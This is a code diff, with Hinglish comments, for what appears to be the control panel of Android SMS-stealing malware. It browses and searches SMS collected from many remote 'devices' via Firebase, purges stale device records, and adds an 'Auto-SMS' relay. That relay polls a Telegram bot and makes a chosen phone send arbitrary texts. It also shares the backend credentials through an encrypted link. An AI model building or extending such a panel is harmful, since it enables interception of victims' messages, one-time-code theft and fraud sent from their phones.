+  var totalShown = 0; deviceGroups.forEach(function(g){ totalShown += g.items.length; });
+  document.getElementById('sr-info').textContent = deviceGroups.length
+    ? '"' + q + '" - ' + deviceGroups.length + ' device, ' + totalShown + ' SMS'
+    : '"' + q + '" - koi SMS nahi';
+  var el = document.getElementById('sr-list');
+  if (!deviceGroups.length) { el.innerHTML = '<div class="empty"><div class="ei">&#128269;</div><p>Koi SMS nahi mila</p></div>'; return; }
+  el.innerHTML = '';
+  var frag = document.createDocumentFragment();
+  deviceGroups.forEach(function(g) {
+    var card = document.createElement('div'); card.className = 'src-card';
+    var badge = document.createElement('span'); badge.className = 'src-badge'; badge.innerHTML = hlTxt(eh(g.name), q);
+    var cnt = document.createElement('span'); cnt.style.cssText = 'font-size:11px;color:#46594e;margin-left:6px;';
+    cnt.textContent = g.items.length + ' SMS';
+    card.appendChild(badge); card.appendChild(cnt);
+    g.items.forEach(function(item) {
+      var s = item.sms;
+      var mc = document.createElement('div'); mc.className = 'sms-card'; mc.style.marginTop = '8px';
+      var aEl = document.createElement('div'); aEl.className = 'sms-addr'; aEl.textContent = 'Address : ' + (s.ph||'-');
+      var bEl = document.createElement('div'); bEl.className = 'sms-body'; bEl.innerHTML = hlTxt(eh(s.msg||''), q);
+      var tEl = document.createElement('div'); tEl.style.cssText = 'font-size:11px;color:#94a3b8;text-align:right;margin-top:4px;';
+      tEl.textContent = fmtDate(s.date);
+      mc.appendChild(aEl); mc.appendChild(bEl); mc.appendChild(tEl);
+      card.appendChild(mc);
+    });
+    (function(k, firstSmsKey){
+      card.addEventListener('click', function(){
+        openDev(k);
+        setTimeout(function() {
+          switchDtl('sms');
+          if (firstSmsKey) {
+            setTimeout(function() {
+              var target = document.getElementById('sms-card-' + firstSmsKey);
+              if (target) {
+                target.scrollIntoView({behavior:'smooth', block:'center'});
+                target.style.background = '#ede9fe';
+                setTimeout(function() { target.style.background = ''; }, 2000);
+              }
+            }, 800);
+          }
+        }, 300);
+      });
+    })(g.devKey, g.items[0].sms._key);
+    frag.appendChild(card);
+  });
+  el.appendChild(frag);
+}
+
+/* ===== CLEANUP FUNCTIONS ===== */
+function cleanOldSms(btn) {
+  var sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+  var offDevs = Object.values(DEVS).filter(function(d){ return !d.on; });
+  if (!offDevs.length) { showToast('Koi offline device nahi!'); return; }
+  if (!confirm(offDevs.length + ' offline devices ka 7+ days purana SMS delete karo?')) return;
+  btn.textContent = 'Working...'; btn.disabled = true;
+  var done = 0, total = offDevs.length, deleted = 0;
+  offDevs.forEach(function(dev) {
+    var did = dev.did || dev.key;
+    fbGet('Sms/' + did).then(function(sd) {
+      if (!sd || typeof sd !== 'object') { done++; if(done>=total) finish(); return; }
+      var toDelete = [];
+      Object.keys(sd).forEach(function(k) {
+        var s = sd[k]; if (!s) return;
+        var ts = getTs(s.date || s.Date || '');
+        if (ts > 0 && ts < sevenDaysAgo) toDelete.push(k);
+      });
+      if (!toDelete.length) { done++; if(done>=total) finish(); return; }
+      var d2 = 0;
+      toDelete.forEach(function(k) {
+        fbDel('Sms/' + did + '/' + k)
+          .then(function(){ deleted++; d2++; if(d2>=toDelete.length){done++;if(done>=total)finish();} })
+          .catch(function(){ d2++; if(d2>=toDelete.length){done++;if(done>=total)finish();} });
+      });
+    }).catch(function(){ done++; if(done>=total) finish(); });
+  });
+  function finish() {
+    btn.textContent = 'Delete 7+ Days Old SMS'; btn.disabled = false;
+    showToast(deleted + ' SMS deleted!');
+    loadAllSms();
+  }
+}
+
+function cleanOldDevices(btn) {
+  var tenDaysAgo = Date.now() - (10 * 24 * 60 * 60 * 1000);
+  var offDevs = Object.values(DEVS).filter(function(d){ return !d.on; });
+  if (!offDevs.length) { showToast('Koi offline device nahi!'); return; }
+  /* Check last SMS time for each offline device */
+  btn.textContent = 'Checking...'; btn.disabled = true;
+  var checked = 0, total = offDevs.length, toDelete = [];
+  offDevs.forEach(function(dev) {
+    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did || dev.key) + '.json?orderBy=%22$key%22&limitToLast=1' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+    fetch(url, { cache: 'no-store' }).then(function(r){ return r.json(); }).then(function(sd) {
+      var latest = 0;
+      if (sd && typeof sd === 'object') {
+        Object.values(sd).forEach(function(s) {
+          var ts = getTs(s.date || s.Date || '');
+          if (ts > latest) latest = ts;
+        });
+      }
+      /* If no SMS or last SMS > 10 days ago */
+      if (latest === 0 || latest < tenDaysAgo) toDelete.push(dev);
+      checked++; if (checked >= total) doDeleteDevices(toDelete, btn);
+    }).catch(function(){ checked++; if(checked>=total) doDeleteDevices(toDelete, btn); });
+  });
+}
+
+function doDeleteDevices(devs, btn) {
+  if (!devs.length) {
+    btn.textContent = 'Delete 10+ Days Offline Devices'; btn.disabled = false;
+    showToast('Koi device 10+ days offline nahi!'); return;
+  }
+  if (!confirm(devs.length + ' devices delete karo (10+ days offline)?')) {
+    btn.textContent = 'Delete 10+ Days Offline Devices'; btn.disabled = false; return;
+  }
+  var done = 0, total = devs.length, deleted = 0;
+  devs.forEach(function(dev) {
+    /* Delete Info + Sms both */
+    fbDel('Info/' + dev.key).then(function(){
+      return fbDel('Sms/' + (dev.did || dev.key));
+    }).then(function(){
+      deleted++; delete DEVS[dev.key]; done++;
+      if (done >= total) {
+        btn.textContent = 'Delete 10+ Days Offline Devices'; btn.disabled = false;
+        renderDevLists(); updSmsCnt();
+        showToast(deleted + ' devices deleted!');
+      }
+    }).catch(function(){
+      done++; if(done>=total){ btn.textContent='Delete 10+ Days Offline Devices'; btn.disabled=false; }
+    });
+  });
+}
+
+/* ===== AUTO-SMS (Telegram → Firebase → SMS APK) ===== */
+var AUTO_SMS_ACTIVE = false;
+var AUTO_SMS_INTERVAL = null;
+var AUTO_SMS_OFFSET = 0;
+var AUTO_SMS_DEV = null; /* current device key */
+
+var TG_WORKER_URL = localStorage.getItem('tg_worker_url') || '';
+var TG_BOT_TOKEN  = localStorage.getItem('tg_bot_token')  || '';
+var TG_CHAT_ID    = localStorage.getItem('tg_chat_id')    || '';
+
+function toggleAutoSms() {
+  if (!AUTO_SMS_ACTIVE) {
+    /* Check if settings exist */
+    if (!TG_WORKER_URL || !TG_BOT_TOKEN || !TG_CHAT_ID) {
+      openAutoSmsSettings();
+      return;
+    }
+    startAutoSms();
+  } else {
+    stopAutoSms();
+  }
+}
+
+function startAutoSms() {
+  if (!CUR) return;
+  AUTO_SMS_ACTIVE = true;
+  AUTO_SMS_DEV = CUR;
+  AUTO_SMS_OFFSET = 0;
+  updateAutoSmsBtn(true);
+  showToast('🤖 Auto-SMS ON — shuru ho raha hai...');
+  /* Get latest update_id so we only process NEW messages from now */
+  var url = TG_WORKER_URL.replace(/\/+$/,'')
+    + '?token=' + encodeURIComponent(TG_BOT_TOKEN)
+    + '&offset=0';
+  fetch(url)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data.ok && data.result && data.result.length) {
+        /* Jump offset to latest+1 — skip all existing messages */
+        AUTO_SMS_OFFSET = data.result[data.result.length - 1].update_id + 1;
+        console.log('Auto-SMS: offset set to', AUTO_SMS_OFFSET);
+      }
+      showToast('🤖 Auto-SMS ON ✅ — naaye messages ka wait hai');
+      AUTO_SMS_INTERVAL = setInterval(pollTelegram, 3000);
+    })
+    .catch(function(e){
+      console.log('Auto-SMS start error:', e.message);
+      showToast('🤖 Auto-SMS ON');
+      AUTO_SMS_INTERVAL = setInterval(pollTelegram, 3000);
+    });
+}
+
+function stopAutoSms() {
+  AUTO_SMS_ACTIVE = false;
+  AUTO_SMS_DEV = null;
+  if (AUTO_SMS_INTERVAL) { clearInterval(AUTO_SMS_INTERVAL); AUTO_SMS_INTERVAL = null; }
+  updateAutoSmsBtn(false);
+  showToast('🤖 Auto-SMS OFF');
+}
+
+function updateAutoSmsBtn(active) {
+  var btn = document.getElementById('autosms-btn');
+  if (!btn) return;
+  if (active) {
+    btn.style.background = 'rgba(34,158,217,.15)';
+    btn.style.color = '#229ED9';
+    btn.style.borderColor = 'rgba(34,158,217,.4)';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg> 🤖 Auto-SMS: ON (polling...)';
+  } else {
+    btn.style.background = 'var(--surface2)';
+    btn.style.color = '#94a3b8';
+    btn.style.borderColor = 'var(--border)';
+    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.248l-1.97 9.289c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L7.48 14.697l-2.95-.924c-.642-.204-.657-.642.136-.953l11.57-4.461c.537-.194 1.006.131.325.889z"/></svg> 🤖 Auto-SMS: OFF';
+  }
+}
+
+function parseTgMessage(text) {
+  /* Format 1: Full format with To: and Message: fields */
+  var toMatch = text.match(/To:\s*(\d+)/i);
+  var msgMatch = text.match(/💬\s*Message:\s*([^\n]+)/i) || text.match(/Message:\s*([^\n]+)/i);
+  if (toMatch && msgMatch) {
+    return { number: toMatch[1].trim(), body: msgMatch[1].trim() };
+  }
+  /* Format 2: "NUMBER | BODY" (one-tap copy line) */
+  var lines = text.trim().split('\n');
+  for (var i = 0; i < lines.length; i++) {
+    var pipeMatch = lines[i].match(/^(\d{10,15})\s*\|\s*(.+)/);
+    if (pipeMatch) {
+      return { number: pipeMatch[1].trim(), body: pipeMatch[2].trim() };
+    }
+  }
+  /* Format 3: First line = number only, second line = body */
+  if (lines.length >= 2 && /^\d{10,15}$/.test(lines[0].trim())) {
+    return { number: lines[0].trim(), body: lines.slice(1).join('\n').trim() };
+  }
+  return null;
+}
+
+function pollTelegram() {
+  if (!AUTO_SMS_ACTIVE || !AUTO_SMS_DEV) return;
+  var workerBase = TG_WORKER_URL.replace(/\/+$/,'');
+  var url = workerBase
+    + '?token=' + encodeURIComponent(TG_BOT_TOKEN)
+    + '&offset=' + AUTO_SMS_OFFSET;
+
+  fetch(url)
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data || !data.ok || !data.result || !data.result.length) return;
+      data.result.forEach(function(update) {
+        if (update.update_id >= AUTO_SMS_OFFSET) {
+          AUTO_SMS_OFFSET = update.update_id + 1;
+        }
+        var msg = update.channel_post || update.message;
+        if (!msg) return;
+        /* Filter by chat ID — compare as strings to handle numeric IDs */
+        var chatId = String(msg.chat && msg.chat.id);
+        var expectedId = String(TG_CHAT_ID).trim();
+        if (expectedId && chatId !== expectedId) {
+          console.log('TG: wrong chat', chatId, '!=', expectedId);
+          return;
+        }
+        var text = msg.text || msg.caption || '';
+        if (!text) return;
+        var parsed = parseTgMessage(text);
+        if (!parsed) {
+          console.log('TG msg could not parse:', text.substring(0,50));
+          return;
+        }
+        console.log('TG parsed OK:', parsed.number, parsed.body.substring(0,20));
+        autoSendSms(parsed.number, parsed.body);
+      });
+    })
+    .catch(function(e) {
+      console.log('TG poll error:', e.message);
+    });
+}
+
+function autoSendSms(number, body) {
+  /* Exactly same as doSendSms() — single PUT to Verify_Device/<did> */
+  if (!AUTO_SMS_DEV || !DB || !NODE) return;
+  var dev = DEVS[AUTO_SMS_DEV];
+  if (!dev) return;
+  /* Exact same did resolution as doSendSms */
+  var did = (dev.did) ? dev.did : AUTO_SMS_DEV;
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/Verify_Device/' + did + '.json' + auth;
+  console.log('Auto-SMS → PUT', url, 'Number:', number);
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ Number: number, Body: body, Status: 'Yes' })
+  })
+  .then(function(r) {
+    if (!r.ok) throw new Error('HTTP ' + r.status);
+    return r.json();
+  })
+  .then(function() {
+    var t = new Date().toLocaleTimeString('en-IN');
+    showToast('✅ Auto-SMS sent → ' + number + ' [' + t + ']');
+    var btn = document.getElementById('autosms-btn');
+    if (btn) btn.innerHTML = '🤖 Auto-SMS: ON ✅ Last: ' + number + ' ' + t;
+  })
+  .catch(function(e) {
+    showToast('❌ Auto-SMS FAIL → ' + number + ': ' + e.message);
+    console.log('Auto-SMS error:', e.message);
+  });
+}
+
+function openAutoSmsSettings() {
+  document.getElementById('as-worker').value = TG_WORKER_URL;
+  document.getElementById('as-token').value = TG_BOT_TOKEN;
+  document.getElementById('as-chatid').value = TG_CHAT_ID;
+  openD('dlg-autosms');
+}
+
+function saveAutoSmsSettings() {
+  var w = document.getElementById('as-worker').value.trim();
+  var t = document.getElementById('as-token').value.trim();
+  var c = document.getElementById('as-chatid').value.trim();
+  if (!w || !t || !c) { showToast('Sab fields bharo!'); return; }
+  TG_WORKER_URL = w;
+  TG_BOT_TOKEN = t;
+  TG_CHAT_ID = c;
+  localStorage.setItem('tg_worker_url', w);
+  localStorage.setItem('tg_bot_token', t);
+  localStorage.setItem('tg_chat_id', c);
+  closeD('dlg-autosms');
+  showToast('✅ Settings saved!');
+  startAutoSms();
+}
+</script>
+
+<!-- ===== AUTO-SMS SETTINGS DIALOG ===== -->
+<div class="overlay" id="dlg-autosms" onclick="if(event.target===this)closeD('dlg-autosms')">
+  <div class="dlg">
+    <div class="dlg-hdr">🤖 Auto-SMS Settings</div>
+    <div class="dlg-body">
+      <div style="background:rgba(34,158,217,.1);border:1px solid rgba(34,158,217,.3);
+        border-radius:10px;padding:10px 12px;margin-bottom:14px;font-size:12px;color:#229ED9;line-height:1.6;">
+        Telegram channel ka naya message aate hi automatically SMS send ho jaayega.
+      </div>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Cloudflare Worker URL</label>
+      <input class="di" id="as-worker" placeholder="https://late-mud-2765.10himakhan.workers.dev" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Bot Token</label>
+      <input class="di" id="as-token" placeholder="1234567890:AAF..." type="password" style="margin-bottom:12px;"/>
+      <label style="font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.6px;display:block;margin-bottom:5px;">Channel Chat ID</label>
+      <input class="di" id="as-chatid" placeholder="-1001234567890" style="margin-bottom:14px;"/>
+      <button class="dbtn" onclick="saveAutoSmsSettings()">✅ Save & Start</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-autosms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== LINK GENERATOR DIALOG ===== -->
+<div class="overlay" id="dlg-linkgen" style="display:none;">
+  <div class="dlg" style="max-width:340px;">
+    <div class="dlg-hdr">&#128279; Link Generator</div>
+    <div class="dlg-body">
+      <p style="font-size:13px;color:#46594e;margin-bottom:14px;">
+        Yeh link kisi ko bhi bhejo — woh sirf password daalke seedha connect ho jaayega, koi aur setup nahi.
+      </p>
+
+      <!-- Password to share - fetched from Firebase -->
+      <div style="background:#fefce8;border:1.5px solid #fde68a;border-radius:10px;padding:12px 14px;margin-bottom:14px;">
+        <div style="font-size:11px;font-weight:700;color:#92400e;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;">&#128272; Link kholne ka Password</div>
+        <div id="lg-pass-show" style="font-size:22px;font-weight:800;color:#92400e;letter-spacing:3px;font-family:monospace;">---</div>
+        <div style="font-size:11px;color:#a16207;margin-top:4px;">Yeh password link ke saath share karo</div>
+      </div>
+
+      <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:12px;margin-bottom:14px;">
+        <div style="font-size:11px;color:#94a3b8;margin-bottom:6px;">Generated Link:</div>
+        <div id="lg-link-text" style="font-size:11px;color:#0c9c5e;word-break:break-all;line-height:1.5;font-family:monospace;"></div>
+      </div>
+      <button class="dbtn" onclick="copyLinkGen()" id="lg-copy-btn">&#128203; Link Copy Karo</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-linkgen')">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+async function openLinkGen() {
+  var base = (window.location.origin + window.location.pathname).split('?')[0].split('#')[0];
+  /* Show loading state while encrypting */
+  var linkEl = document.getElementById('lg-link-text');
+  linkEl.textContent = 'Generating encrypted link...';
+  document.getElementById('lg-copy-btn').textContent = '📋 Link Copy Karo';
+  try {
+    var encrypted = await encryptData({ furl: DB, key: APIKEY||'', node: NODE||'csc6', pid: '' });
+    var link = base + '#' + encrypted;
+    linkEl.textContent = link;
+  } catch(e) {
+    linkEl.textContent = 'Error: ' + e.message;
+  }
+  /* Fetch current password from Firebase to show it clearly */
+  var passEl = document.getElementById('lg-pass-show');
+  if (passEl) passEl.textContent = 'Fetch ho raha hai...';
+  fbGetRoot(NODE + '/Admin_Password').then(function(p) {
+    if (passEl) passEl.textContent = p ? String(p) : '(set nahi hai — pehle Change se set karo)';
+  }).catch(function() {
+    if (passEl) passEl.textContent = '(fetch fail)';
+  });
+  try { localStorage.removeItem('csc_saved_links'); } catch(e) {}
+  openD('dlg-linkgen');
+}
+
+function saveLinkToLocal(link, name) {
+  try {
+    var links = JSON.parse(localStorage.getItem('csc_saved_links') || '[]');
+    /* Update if same node already saved, else add new */
+    var found = false;
+    for (var i = 0; i < links.length; i++) {
+      if (links[i].name === name) { links[i].link = link; found = true; break; }
+    }
+    if (!found) links.push({ name: name, link: link });
+    localStorage.setItem('csc_saved_links', JSON.stringify(links));
+  } catch(e) {}
+}
+
+function deleteSavedLink(name) {
+  try {
+    var links = JSON.parse(localStorage.getItem('csc_saved_links') || '[]');
+    links = links.filter(function(l) { return l.name !== name; });
+    localStorage.setItem('csc_saved_links', JSON.stringify(links));
+    renderSavedLinks();
+  } catch(e) {}
+}
+
+function renderSavedLinks() {
+  try {
+    var links = JSON.parse(localStorage.getItem('csc_saved_links') || '[]');
+    var sec = document.getElementById('saved-links-section');
+    var list = document.getElementById('saved-links-list');
+    if (!sec || !list) return;
+    if (!links.length) { sec.style.display = 'none'; return; }
+    sec.style.display = 'block';
+    list.innerHTML = '';
+    links.forEach(function(item) {
+      var row = document.createElement('div');
+      row.style.cssText = 'display:flex;align-items:center;gap:8px;margin-bottom:8px;';
+      var btn = document.createElement('button');
+      btn.style.cssText = 'flex:1;background:#f0fdf4;border:1.5px solid #bbf7d0;border-radius:10px;padding:11px 14px;font-size:13px;font-weight:700;color:#0c9c5e;cursor:pointer;text-align:left;';
+      btn.innerHTML = '&#128279; ' + item.name;
+      btn.onclick = (function(lnk) { return function() {
+        /* Load this saved link - parse its params and show password screen */
+        var url = new URL(lnk);
+        var furl = url.searchParams.get('furl');
+        var key  = url.searchParams.get('key');
+        var node = url.searchParams.get('node') || 'csc6';
+        if (furl) {
+          QC_PARAMS = { furl: furl.replace(/\/+$/, ''), key: key || '', node: node };
+          document.getElementById('qc-section').style.display = 'block';
+          document.getElementById('full-setup-section').style.display = 'none';
+          document.getElementById('qc-pass').value = '';
+          document.getElementById('qc-err').style.display = 'none';
+          document.getElementById('qc-btn').disabled = false;
+          document.getElementById('qc-btn').textContent = '⚡ Connect';
+          setTimeout(function() { document.getElementById('qc-pass').focus(); }, 100);
+        }
+      }; })(item.link);
+      var del = document.createElement('button');
+      del.style.cssText = 'background:none;border:1px solid #fca5a5;border-radius:8px;padding:8px 10px;font-size:12px;color:#dc2626;cursor:pointer;';
+      del.innerHTML = '&#10005;';
+      del.onclick = (function(nm) { return function() { deleteSavedLink(nm); }; })(item.name);
+      row.appendChild(btn);
+      row.appendChild(del);
+      list.appendChild(row);
+    });
+  } catch(e) {}
+}
+
+function copyLinkGen() {
+  var txt = document.getElementById('lg-link-text').textContent;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(function() {
+      document.getElementById('lg-copy-btn').textContent = '✅ Copied!';
+      setTimeout(function() {
+        document.getElementById('lg-copy-btn').textContent = '📋 Link Copy Karo';
+      }, 2000);
+    }).catch(function() { fallbackCopyLinkGen(txt); });
+  } else {
+    fallbackCopyLinkGen(txt);
+  }
+}
+
+function fallbackCopyLinkGen(txt) {
+  var ta = document.createElement('textarea');
+  ta.value = txt; ta.style.position = 'fixed'; ta.style.opacity = '0';
+  document.body.appendChild(ta); ta.select();
+  try {
+    document.execCommand('copy');
+    document.getElementById('lg-copy-btn').textContent = '✅ Copied!';
+    setTimeout(function() {
+      document.getElementById('lg-copy-btn').textContent = '📋 Link Copy Karo';
+    }, 2000);
+  } catch(e) { showToast('Copy manually karo'); }
+  document.body.removeChild(ta);
+}
+</script>
+
